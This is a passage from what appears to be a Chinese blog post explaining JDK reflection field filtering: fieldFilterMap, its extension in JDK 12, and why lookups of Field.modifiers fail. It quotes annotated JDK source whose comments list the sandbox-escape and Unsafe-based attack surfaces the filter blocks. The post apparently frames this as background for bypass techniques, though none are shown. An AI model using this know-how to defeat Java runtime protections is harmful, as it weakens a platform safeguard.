&lt;p&gt;&lt;b&gt;为什么要过滤这些成员？&lt;/b&gt;</span></span><br><span class="line"><span class="comment"> * 这些字段包含敏感状态或 VM 内部对象引用。如果对外暴露，可能被第三方代码通过反射</span></span><br><span class="line"><span class="comment"> * 读取/修改，从而绕过安全检查或破坏封装（比如篡改过滤表本身、探知/替换类加载器、</span></span><br><span class="line"><span class="comment"> * 直连全局安全管理器等）。因此在对外返回反射结果前，需要屏蔽这些成员。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;实现上采用写时复制（copy-on-write）：读取高频、更新极少，通过替换整张 Map</span></span><br><span class="line"><span class="comment"> * 引用（&#123;<span class="doctag">@code</span> volatile&#125;）来发布新快照，避免读路径加锁。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reflection</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Map&lt;Class&lt;?&gt;, String[]&gt; fieldFilterMap;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Map&lt;Class&lt;?&gt;, String[]&gt; methodFilterMap;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        Map&lt;Class&lt;?&gt;, String[]&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ① Reflection 自身的内部表：防止“反射自举攻击”</span></span><br><span class="line">        <span class="comment">//    - fieldFilterMap / methodFilterMap 是反射层用来屏蔽敏感成员的“黑名单”。</span></span><br><span class="line">        <span class="comment">//    - 若不屏蔽这两个字段，外部代码可能通过反射直接读取/修改它们，</span></span><br><span class="line">        <span class="comment">//      从而关闭/篡改过滤机制本身（例如把某些敏感字段从黑名单里移除）。</span></span><br><span class="line">        map.put(Reflection.class, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;fieldFilterMap&quot;</span>, <span class="string">&quot;methodFilterMap&quot;</span> &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ② System.security：历史上的全局 SecurityManager 引用（敏感入口）</span></span><br><span class="line">        <span class="comment">//    - 直接暴露可能被用来探知或替换安全管理器对象，绕过</span></span><br><span class="line">        <span class="comment">//      System.setSecurityManager 的权限审计路径（虽然后续版本已逐步废弃 SM）。</span></span><br><span class="line">        <span class="comment">//    - 屏蔽该字段可减少依赖实现细节的安全绕过面。</span></span><br><span class="line">        map.put(System.class, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;security&quot;</span> &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ③ Class.classLoader：定义该类的类加载器（高敏感对象）</span></span><br><span class="line">        <span class="comment">//    - 类加载器掌握代码与资源的加载边界；若可被随意获取/替换，可能被用于</span></span><br><span class="line">        <span class="comment">//      未授权的类定义、资源探测或沙箱逃逸。</span></span><br><span class="line">        <span class="comment">//    - JDK 对 Class#getClassLoader() 有一套受控访问与安全检查，</span></span><br><span class="line">        <span class="comment">//      屏蔽底层字段可避免通过“直接反射字段”绕过这些检查。</span></span><br><span class="line">        map.put(Class.class, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;classLoader&quot;</span> &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发布字段过滤规则快照</span></span><br><span class="line">        fieldFilterMap = map;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 方法过滤表当前为空；预留将来对敏感方法名进行屏蔽的能力</span></span><br><span class="line">        methodFilterMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>但在 JDK12 中，限制变多了，其中 <code>Field</code> 的所有成员成员都被限制为不可通过反射获取。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 反射工具类，提供 &#123;<span class="doctag">@code</span> java.lang&#125; 与 &#123;<span class="doctag">@code</span> java.lang.reflect&#125; 使用的公共工具方法，</span></span><br><span class="line"><span class="comment"> * 并在对外暴露反射结果时对部分“敏感成员”做过滤（黑名单）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;设计要点&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * 1) 这些过滤表读取极其频繁、更新极少，因此采用“写时复制（copy-on-write）”策略：</span></span><br><span class="line"><span class="comment"> *    需要更新时构造一张新的不可变 Map（如 Map.of / Map.copyOf），再一次性赋值给</span></span><br><span class="line"><span class="comment"> *    &#123;<span class="doctag">@code</span> volatile&#125; 字段，读路径无锁、可见性由 &#123;<span class="doctag">@code</span> volatile&#125; 保证。</span></span><br><span class="line"><span class="comment"> * 2) 过滤仅影响“通过标准反射 API 返回/枚举到的成员”；并不改变类本身的字节码或运行语义。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reflection</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">     * 字段过滤表：key 为“声明类”，value 为该类中需屏蔽的字段名集合。</span></span><br><span class="line"><span class="comment">     * 使用 &#123;<span class="doctag">@code</span> Set&lt;String&gt;&#125; 支持通配（见 &#123;<span class="doctag">@link</span> #ALL_MEMBERS&#125;）。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Map&lt;Class&lt;?&gt;, Set&lt;String&gt;&gt; fieldFilterMap;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">     * 方法过滤表：key 为“声明类”，value 为该类中需屏蔽的方法名集合。</span></span><br><span class="line"><span class="comment">     *（当前示例为空，说明暂不屏蔽任何方法。）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Map&lt;Class&lt;?&gt;, Set&lt;String&gt;&gt; methodFilterMap;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 通配符：表示“该类下的所有同类成员均被过滤”。 */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">WILDCARD</span> <span class="operator">=</span> <span class="string">&quot;*&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 便捷常量：包含一个通配符的不可变集合，等价于“屏蔽全部成员”。 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Set&lt;String&gt; ALL_MEMBERS = Set.of(WILDCARD);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 静态初始化：发布默认过滤规则的不可变快照</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// 说明：下面每条规则后的注释解释“为什么要过滤”该字段/类的成员</span></span><br><span class="line"></span><br><span class="line">        fieldFilterMap = Map.of(</span><br><span class="line">            <span class="comment">// 1) Reflection：屏蔽自身所有字段</span></span><br><span class="line">            <span class="comment">//    目的：防止外部通过反射读取/篡改过滤表本身（fieldFilterMap/methodFilterMap 等），</span></span><br><span class="line">            <span class="comment">//          从而失效或绕过过滤机制（“反射自举”攻击面）。</span></span><br><span class="line">            Reflection.class, ALL_MEMBERS,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 2) AccessibleObject：屏蔽所有字段</span></span><br><span class="line">            <span class="comment">//    目的：阻止外部直接操纵反射对象的内部状态（如 override/overrideFlag 等实现细节），</span></span><br><span class="line">            <span class="comment">//          避免配合 Unsafe 等手段修改可访问位、跳过权限校验。</span></span><br><span class="line">            AccessibleObject.class, ALL_MEMBERS,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 3) Class：屏蔽 classLoader 字段</span></span><br><span class="line">            <span class="comment">//    目的：类加载器是高敏感对象；强行读取/写入可能导致未授权类定义、资源探测、</span></span><br><span class="line">            <span class="comment">//          沙箱逃逸等。应通过受控 API（Class#getClassLoader 等）并受安全检查访问。</span></span><br><span class="line">            Class.class, Set.of(<span class="string">&quot;classLoader&quot;</span>),</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 4) ClassLoader：屏蔽所有字段</span></span><br><span class="line">            <span class="comment">//    目的：阻断对类加载器内部结构（定义缓存、并行加载状态、父子关系等）的直接反射访问，</span></span><br><span class="line">            <span class="comment">//          以免借道内部字段+本地写操作（Unsafe）触达 defineClass/内存镜像等敏感路径。</span></span><br><span class="line">            ClassLoader.class, ALL_MEMBERS,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 5) Constructor：屏蔽所有字段</span></span><br><span class="line">            <span class="comment">//    目的：阻断对反射“构造器对象”内部字段（如 clazz、root、slot、modifiers 等）的读写，</span></span><br><span class="line">            <span class="comment">//          防止通过修改元数据来伪造可见性或绑定关系，从而绕过 checkCanSetAccessible。</span></span><br><span class="line">            Constructor.class, ALL_MEMBERS,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 6) Field：屏蔽所有字段</span></span><br><span class="line">            <span class="comment">//    目的：阻断对反射“字段对象”内部实现细节的篡改（如 modifiers、override 位、偏移量等），</span></span><br><span class="line">            <span class="comment">//          避免利用私有字段 + Unsafe 写内存来“开盖”或重写修饰符。</span></span><br><span class="line">            Field.class, ALL_MEMBERS,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 7) Method：屏蔽所有字段</span></span><br><span class="line">            <span class="comment">//    目的：阻断对反射“方法对象”内部字段的直接访问（如 modifiers、clazz、methodAccessor 等），</span></span><br><span class="line">            <span class="comment">//          防止把私有/受保护方法“伪装成 public”后调用（典型利用面）。</span></span><br><span class="line">            Method.class, ALL_MEMBERS,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 8) Module：屏蔽所有字段</span></span><br><span class="line">            <span class="comment">//    目的：防止直接读取/篡改模块内部状态（如包集、读取边、开放/导出状态缓存等），</span></span><br><span class="line">            <span class="comment">//          避免规避 JPMS 的显式 opens/exports 规则。</span></span><br><span class="line">            Module.class, ALL_MEMBERS,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 9) System：屏蔽 security 字段（历史上的全局 SecurityManager 引用）</span></span><br><span class="line">            <span class="comment">//    目的：避免通过反射直接获取/替换安全管理器对象，绕过设置/权限审计路径</span></span><br><span class="line">            <span class="comment">//          （尽管现代 JDK 已逐步废弃 SM 语义，仍保留屏蔽以减小攻击面）。</span></span><br><span class="line">            System.class, Set.of(<span class="string">&quot;security&quot;</span>)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 方法过滤表：当前无屏蔽方法（保留扩展点）。</span></span><br><span class="line">        <span class="comment">// 如需屏蔽，可按需添加，例如：</span></span><br><span class="line">        <span class="comment">// methodFilterMap = Map.of(System.class, Set.of(&quot;setSecurityManager&quot;));</span></span><br><span class="line">        methodFilterMap = Map.of();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这部分修改对应的 <a class="link"   target="_blank" rel="noopener" href="https://bugs.openjdk.org/browse/JDK-8210522" >issue<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>：</p>
<blockquote>
<p><strong>问题</strong>：<br><code>java.lang.reflect</code> 和 <code>java.lang.invoke</code> 包中的许多类都包含私有字段，如果直接访问这些字段，可能会破坏运行时或导致虚拟机崩溃。理想情况下，<code>java.base</code> 中所有非公共&#x2F;非受保护的字段都应该通过核心反射进行过滤，并且不能通过 <code>Unsafe</code> API 进行读写，但目前我们离这个目标还有很大距离。与此同时，现有的过滤机制暂时充当了一个应急补救措施。</p>
<p><strong>解决方案</strong>：<br>扩展过滤器，涵盖以下类中的所有字段：</p>
<ul>
<li><code>java.lang.ClassLoader</code></li>
<li><code>java.lang.reflect.AccessibleObject</code></li>
<li><code>java.lang.reflect.Constructor</code></li>
<li><code>java.lang.reflect.Field</code></li>
<li><code>java.lang.reflect.Method</code></li>
<li>以及 <code>java.lang.invoke.MethodHandles.Lookup</code> 中用于查找类和访问模式的私有字段。</li>
</ul>
</blockquote>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>其实从上面的分析来看实际上在 JDK12 之前 Java 就对获取字段进行了限制。只不过从 JDK12 开始由于这个限制的加强，导致一些关键操作失败，由此衍生出一些绕过方法。因此这里把 JDK12 作为一个阶段的起点。</p>
<p>例如从 JDK 12 起，在修改 <code>final</code> 类型的变量的过程中，调用 <code>getDeclaredField</code> 函数获取<code>Field</code> 对象的 <code>modifiers</code> 成员时由于 <code>Field</code> 对象的所有成员都被过滤导致无法找到：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.NoSuchFieldException: modifiers</span><br><span class="line">    at java.base/java.lang.Class.getDeclaredField(Class.java:2412)</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p><code>getDeclaredField</code> 函数实际会通过调用 <code>privateGetDeclaredFields</code> 函数来获取所有字段，在 <code>privateGetDeclaredFields</code> 函数中：</p>
<ul>
<li>首先会调用 <code>getDeclaredFields0</code> 从 JVM 中获取调用 <code>getDeclaredField</code> 的 <code>clazz</code> 所表示的类的所有字段。</li>
<li>之后调用 <code>Reflection.filterFields</code> 函数利用 <code>fieldFilterMap</code> 把这些字段过滤一遍，仅留下允许的字段。</li>
</ul>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回由此 &#123;<span class="doctag">@code</span> Class&#125; 表示的类或接口&lt;strong&gt;直接声明&lt;/strong&gt;的、名称为 &#123;<span class="doctag">@code</span> name&#125; 的字段对象。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 与 &#123;<span class="doctag">@link</span> #getField(String)&#125; 不同，本方法&lt;strong&gt;不搜索超类层次&lt;/strong&gt;，也会返回</span></span><br><span class="line"><span class="comment"> * 非 public 的字段（private/protected/包可见）；本方法仅获取“字段的反射对象”，</span></span><br><span class="line"><span class="comment"> * 并不改变其可见性。若需越权访问，请使用 &#123;<span class="doctag">@link</span> Field#setAccessible(boolean)&#125; /</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> Field#trySetAccessible()&#125;，该操作受 JPMS（模块化）的 opens 规则与</span></span><br><span class="line"><span class="comment"> * SecurityManager（若启用）共同约束。</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;返回的 &#123;<span class="doctag">@link</span> Field&#125; 为内部元数据的&lt;strong&gt;防御性副本&lt;/strong&gt;，</span></span><br><span class="line"><span class="comment"> * 以避免调用方通过共享对象篡改反射缓存或实现细节。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> name 字段的&lt;strong&gt;简单名称&lt;/strong&gt;（区分大小写），不得为 &#123;<span class="doctag">@code</span> null&#125;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 匹配名称的字段对象（属于“本类直接声明”的字段）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NoSuchFieldException   若未找到同名字段（仅在本类/接口的“声明集合”中查找）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NullPointerException   若 &#123;<span class="doctag">@code</span> name&#125; 为 &#123;<span class="doctag">@code</span> null&#125;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> SecurityException      若安全管理器阻止对声明成员的检查（参见 &#123;<span class="doctag">@code</span> checkMemberAccess&#125;）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> #getField(String)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> #getDeclaredFields()</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> Field#setAccessible(boolean)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line"><span class="keyword">public</span> Field <span class="title function_">getDeclaredField</span><span class="params">(String name)</span></span><br><span class="line">        <span class="keyword">throws</span> NoSuchFieldException, SecurityException &#123;</span><br><span class="line">    <span class="comment">// 0) 形参校验：字段名不可为 null</span></span><br><span class="line">    Objects.requireNonNull(name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) 安全路径（旧版 Java 安全管理器）：如启用，则检查调用方是否允许“查看声明成员”</span></span><br><span class="line">    <span class="comment">//    这里传入的是 Member.DECLARED（仅检查本类声明的成员，不含继承）</span></span><br><span class="line">    <span class="type">SecurityManager</span> <span class="variable">sm</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (sm != <span class="literal">null</span>) &#123;</span><br><span class="line">        checkMemberAccess(sm, Member.DECLARED, Reflection.getCallerClass(), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 在“声明字段列表”里按名称查找（false 表示：不只要 public，而是“所有可见性”）</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> searchFields(privateGetDeclaredFields(<span class="literal">false</span>), name);</span><br><span class="line">    <span class="keyword">if</span> (field == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 3) 未找到：仅在“本类/接口的声明字段集合”中查找，找不到就抛异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 返回一个防御性副本，避免直接暴露内部缓存对象（实现细节：ReflectionFactory.copyField）</span></span><br><span class="line">    <span class="keyword">return</span> getReflectionFactory().copyField(field);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回此类/接口&lt;strong&gt;直接声明&lt;/strong&gt;的字段数组（可选仅 public）。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 该方法是“热路径”上的内部帮助方法：优先从反射缓存 &#123;<span class="doctag">@code</span> ReflectionData&#125;</span></span><br><span class="line"><span class="comment"> * 读取；若缓存缺失，则通过 VM 的本地方法获取原始字段数组，再经</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span> Reflection.filterFields(this, ...)&#125; 应用“敏感成员过滤规则”，</span></span><br><span class="line"><span class="comment"> * 最后将结果写回缓存并返回。</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;注意&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;仅包含“直接声明”的字段，不含父类/接口成员；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;当 &#123;<span class="doctag">@code</span> publicOnly == true&#125; 时，仅包含本类声明的 public 字段；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;结果数组可能被缓存重用，应视为只读；调用方不要修改数组内容；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;过滤规则会屏蔽如 &#123;<span class="doctag">@code</span> classLoader&#125;、安全相关字段以及反射实现内部状态等敏感成员；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;本方法不做可访问性开盖；是否能越权访问由后续 &#123;<span class="doctag">@code</span> setAccessible&#125; 判定。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> publicOnly 是否仅返回本类&lt;strong&gt;声明的 public 字段&lt;/strong&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 按条件筛选后的字段数组（已应用敏感成员过滤）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Field[] privateGetDeclaredFields(<span class="type">boolean</span> publicOnly) &#123;</span><br><span class="line">    Field[] res;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A) 尝试从反射数据缓存读取（ReflectionData 由 Class 维护）</span></span><br><span class="line">    ReflectionData&lt;T&gt; rd = reflectionData();</span><br><span class="line">    <span class="keyword">if</span> (rd != <span class="literal">null</span>) &#123;</span><br><span class="line">        res = publicOnly ? rd.declaredPublicFields : rd.declaredFields;</span><br><span class="line">        <span class="keyword">if</span> (res != <span class="literal">null</span>) <span class="keyword">return</span> res; <span class="comment">// 命中缓存</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// B) 缓存未命中：调用 VM 层获取原始字段数组，然后应用“敏感成员过滤”</span></span><br><span class="line">    <span class="comment">//    Reflection.filterFields 会基于内部黑名单（fieldFilterMap）剔除不应暴露的字段</span></span><br><span class="line">    res = Reflection.filterFields(<span class="built_in">this</span>, getDeclaredFields0(publicOnly));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// C) 回写缓存：分别缓存“全部声明字段”和“仅 public 声明字段”的结果</span></span><br><span class="line">    <span class="keyword">if</span> (rd != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (publicOnly) &#123;</span><br><span class="line">            rd.declaredPublicFields = res;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            rd.declaredFields = res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>filterFields</code> 函数实际上就是暴力枚举获取到的所有字段 <code>members</code> 以及需要过滤的字段名称 <code>filteredNames</code> 得到过滤后的字段数组。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 按“字段黑名单”过滤指定类的字段数组。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;过滤规则来自 &#123;<span class="doctag">@code</span> fieldFilterMap&#125;：key 为声明类，value 为需屏蔽的字段名集合。</span></span><br><span class="line"><span class="comment"> * 若集合包含通配符 &#123;<span class="doctag">@code</span> &quot;*&quot;&#125;，则表示“该类的全部字段均被过滤”。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;行为特征&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;若没有该类的过滤规则（值为 &#123;<span class="doctag">@code</span> 